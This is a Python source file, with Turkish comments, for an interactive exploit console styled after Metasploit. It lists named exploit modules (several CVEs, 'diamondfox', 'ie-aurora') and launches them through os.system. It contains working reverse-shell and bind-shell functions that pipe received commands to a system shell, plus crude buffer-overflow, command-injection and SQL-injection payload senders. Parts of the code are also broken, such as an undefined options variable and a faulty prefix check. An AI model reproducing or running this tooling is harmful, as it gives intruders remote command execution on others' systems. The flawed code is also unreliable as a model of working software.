import os
import json
from colorama import init, Fore, Style
import socket
import subprocess
import base64
import requests
# Renk ayarları
init(autoreset=True)

# Exploit listesi ve seçenekler
exploits = {
    "multi/handler": {"LHOST": "0.0.0.0", "LPORT": "4444", "RHOST": None, "RPORT": None, "FILENAME": "multi.handler", "ARG": None, "ARGRUN": None},
    "discordexploit": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "discord_exploit", "ARG": None, "ARGRUN": None},
    "dropleganger": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "dropleganger", "ARG": None, "ARGRUN": None},
    "hydrapwn": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "hydrapwn", "ARG": None, "ARGRUN": None},
    "collectid": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "collectid", "ARG": None, "ARGRUN": None},
    "cve-2006": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "cve_2006", "ARG": None, "ARGRUN": None},
    "cve-2016-3074": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "cve_2016_3074", "ARG": None, "ARGRUN": None},
    "cve-2018-6389": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "cve_2018_6389", "ARG": None, "ARGRUN": None},
    "cve-2018-10561": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "cve_2018_10561", "ARG": None, "ARGRUN": None},
    "camexploit2": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "camexploit2", "ARG": None, "ARGRUN": None},
    "crashcast": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "crashcast", "ARG": None, "ARGRUN": None},
    "diamondfox": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "diamondfox", "ARG": None, "ARGRUN": None},
    "fuzzer_exp": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "fuzzer_exp", "ARG": None, "ARGRUN": None},
    "ie-aurora": {"LHOST": None, "LPORT": None, "RHOST": None, "RPORT": None, "FILENAME": "ie_aurora", "ARG": None, "ARGRUN": None},
}

# Global değişkenler
current_exploit = None
log_file = "exploiter.log"

def inputer(exploitpth=None):
    """Konsol girişi için prompt ayarlar."""
    global prompt
    exploit = exploitpth if exploitpth else None
    prompt = (
        f"int4 exploit({Fore.RED + Style.BRIGHT}{exploit}{Style.RESET_ALL}) > " if exploit else
        f"int4 ({Fore.RED}exploiter{Style.RESET_ALL}) > "
    )

inputer()

def bind_shell(target_port):
    s = socket.socket()
    s.bind(("", target_port))
    s.listen(1)
    conn, addr = s.accept()
    while True:
        command = conn.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        conn.send(output.stdout + output.stderr)
    conn.close()
    s.close()

def list_exploits():
    """Mevcut exploitleri listeler."""
    print("\nAvailable Exploits:")
    for exploit in exploits:
        print(f"- {exploit}")
    print()

def show_options():
    """Seçilen exploit için seçenekleri gösterir."""
    if current_exploit is None:
        print("No exploit selected. Use `use [exploit_name]` to select an exploit.")
        return
    print("\nOptions for exploit:", current_exploit)
    options = exploits[current_exploit]
    print("Name     Current Setting    Required    Description")
    print("----     ---------------    --------    -----------")
    for opt, value in options.items():
        required = "yes" if opt in ["LHOST", "LPORT"] else "no"
        current_value = value if value else "Not set"
        print(f"{opt:<9} {current_value:<15} {required:<10} Connection Parameter")
    print()
def reverse_shell(target_ip, target_port):
    s = socket.socket()
    s.connect((target_ip, target_port))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    s.close()
    
def load_options():
    """Options dosyasından ayarları yükler."""
    if os.path.isfile(log_file) and os.path.getsize(log_file) > 0:
        with open(log_file, "r") as f:
            options = json.load(f)
            for opt, value in options.items():
                if current_exploit and opt in exploits[current_exploit]:
                    exploits[current_exploit][opt] = value
            print("Options loaded from log file.")
def buffer_overflow_exploit(target_ip, target_port):
    buffer = b"A" * 1024  # Basit bir buffer overflow
    s = socket.socket()
    s.connect((target_ip, target_port))
    s.send(buffer)
    s.close()

# Exploit: Command Injection
def command_injection_exploit(target_ip, target_port):
    payload = "echo 'Exploit çalıştı!'"
    s = socket.socket()
    s.connect((target_ip, target_port))
    s.send(payload.encode())
    s.close()

# Exploit: SQL Injection
def sql_injection_exploit(target_ip, target_port):
    payload = "1' OR '1'='1'; --"  # Basit bir SQL injection payload
    s = socket.socket()
    s.connect((target_ip, target_port))
    s.send(payload.encode())
    s.close()

def save_options():
    """Ayarları dosyaya kaydeder."""
    options = {opt: value for opt, value in exploits[current_exploit].items() if value is not None}
    with open(log_file, "w") as f:
        json.dump(options, f)
    print("Options saved to log file.")

def run_exploit():
    """Seçilen exploit'i çalıştırır."""
    if current_exploit is None:
        print("No exploit selected. Use `use [exploit_name]` to select an exploit.")
        return

    # Exploit dosyasının adını al
    options = exploits[current_exploit]
    exploit_filename = options["FILENAME"]
    if exploit_filename is None:
        print("Exploit file is not defined for this exploit.")
        return

    # Komutu oluşturun
    command = f"python modules/exploits/{exploit_filename}"

    # ARG ile belirtilen argümanları ekleyin
    if options['ARG'] is not None:
        command += f" {options['ARG']}"  # ARG ekle

    # ARGRUN ile belirtilen argümanları ekleyin
    if options['ARGRUN'] is not None:
        command += f" {options['ARGRUN']}"  # ARGRUN ekle

    # Komut çalıştır
    try:
        os.system(command)
    except Exception as e:
        print(f"Failed to run exploit: {str(e)}")

def reset_options():
    """Mevcut exploit'in ayarlarını varsayılan değerlere sıfırlar."""
    global current_exploit
    if current_exploit is None:
        print("No exploit selected. Use `use [exploit_name]` to select an exploit.")
        return
    for opt in exploits[current_exploit]:
        exploits[current_exploit][opt] = None
    print(f"Options for exploit {current_exploit} have been reset to default.")

def show_current_exploit():
    """Kullanıcının şu anki exploit'ini gösterir."""
    if current_exploit is None:
        print("No exploit is currently selected.")
    else:
        print(f"Current exploit: {current_exploit}")
def show_help():
    """Kullanılabilir komutların listesini gösterir."""
    print("Available commands:")
    print("- list exploits: Show all available exploits.")
    print("- show options: Show options for the selected exploit.")
    print("- run: Execute the selected exploit.")
    print("- set [OPTION]=[VALUE]: Set a specific option for the exploit.")
    print("- use [exploit_name]: Select an exploit.")
    print("- reset: Reset options for the current exploit to defaults.")
    print("- current exploit: Show the currently selected exploit.")
    print("- help: Show this help message.")
    print("- clear: Clear the console.")
    print("- exit: Exit the application.")

# Ana döngü
while True:
    sploit = input(prompt)

    if sploit.lower() == "list exploits":
        list_exploits()

    elif sploit.lower() == "show options":
        show_options()

    elif sploit.lower() == "run":
        load_options()  # Ayarları dosyadan yükle
        run_exploit()
        save_options()  # Ayarları dosyaya kaydet

    elif sploit.startswith("set"):
        setter = sploit.split()
        if len(setter) == 3:
            option_name, option_value = setter[1], setter[2]
            if current_exploit is not None and option_name in exploits[current_exploit]:
                exploits[current_exploit][option_name] = option_value
                print(f"{option_name} set to {option_value}.")
            else:
                print(f"Option '{option_name}' is not valid for exploit '{current_exploit}'.")
        else:
            print("Usage: set [OPTION]=[VALUE]")

    elif sploit.startswith("use"):
        exploit_name = sploit.split()[1] if len(sploit.split()) > 1 else None
        if exploit_name in exploits:
            current_exploit = exploit_name
            inputer(current_exploit)
            print(f"Exploit '{current_exploit}' selected.")
        else:
            print(f"Exploit '{exploit_name}' not found.")
    elif sploit.lower() == "reset":
        reset_options()
    elif sploit.startswith("exploit"):
    	arg = sploit[7:]
    	opt = """
    exploit > bind_shell 	 or exploit -> bindshell
    	"""
    	if arg.startswith(">" or "->"):
    		if arg.startswith("->"):
    			strr = arg[3:]
    			if strr == "bind_shell":
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sending exploit and bind_shell")
    				bind_shell(options["LPORT"])
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sended!")
    			if strr == "reverse_shell":
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sending exploit and reverse_shell")
    				reverse_shell(options["LHOST"], options["LPORT"])
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "exploit sended!")
    			if strr == "buffer_overflow":
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sending exploit and buffer_overflow")
    				buffer_overflow_exploit(options["RHOST"], options["RPORT"])
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sended!")
    		if arg.startswith(">"):
    			strr = arg[2:]
    			if strr == "bind_shell":
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sending exploit and bind_shell")
    				bind_shell(options["LPORT"])
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sended!")
    			if strr == "reverse_shell":
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sending exploit and reverse_shell")
    				reverse_shell(options["LHOST"], options["LPORT"])
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "exploit sended!")
    			if strr == "buffer_overflow":
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sending exploit and buffer_overflow")
    				buffer_overflow_exploit(options["RHOST"], options["RPORT"])
    				print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sended!")
    	else:
    		print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sending exploit...")
    		load_options()
    		run_exploit()
    		print("[" + Fore.RED + "intbase" + Fore.RESET + "]" + Fore.GREEN + "sended!")
    		save_options()
    		
    elif sploit.lower() == "current exploit":
        show_current_exploit()

    elif sploit.lower() == "help":
        show_help()

    elif sploit.lower() == "clear":
        os.system('cls' if os.name == 'nt' else 'clear')

    elif sploit.lower() == "exit":
        print("Exiting the application.")
        break

    else:
        print(f"Unknown command: {sploit}. Type 'help' for a list of commands.")